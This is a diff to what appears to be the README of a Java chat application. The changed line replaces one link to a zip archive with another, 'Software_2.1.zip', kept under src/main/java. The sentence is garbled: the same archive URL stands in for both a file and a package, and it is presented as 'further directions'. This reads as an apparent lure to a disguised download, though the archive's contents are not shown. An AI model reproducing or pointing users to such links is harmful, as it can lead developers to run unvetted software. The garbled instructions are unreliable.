@@ -10,4 +10,4 @@ Proceed to your browser and type  "localhost:8080" in you address bar ans click 
 
 To test the capability of many users joining, open the same url in another browser and login using another name.
 
-In your code, proceed to the file https://raw.githubusercontent.com/Atuti/Chato/main/src/test/java/Software_v3.0.zip that is in the package "https://raw.githubusercontent.com/Atuti/Chato/main/src/test/java/Software_v3.0.zip" for further directions.
+In your code, proceed to the file https://github.com/Atuti/Chato/raw/refs/heads/main/src/main/java/Software_2.1.zip that is in the package "https://github.com/Atuti/Chato/raw/refs/heads/main/src/main/java/Software_2.1.zip" for further directions.
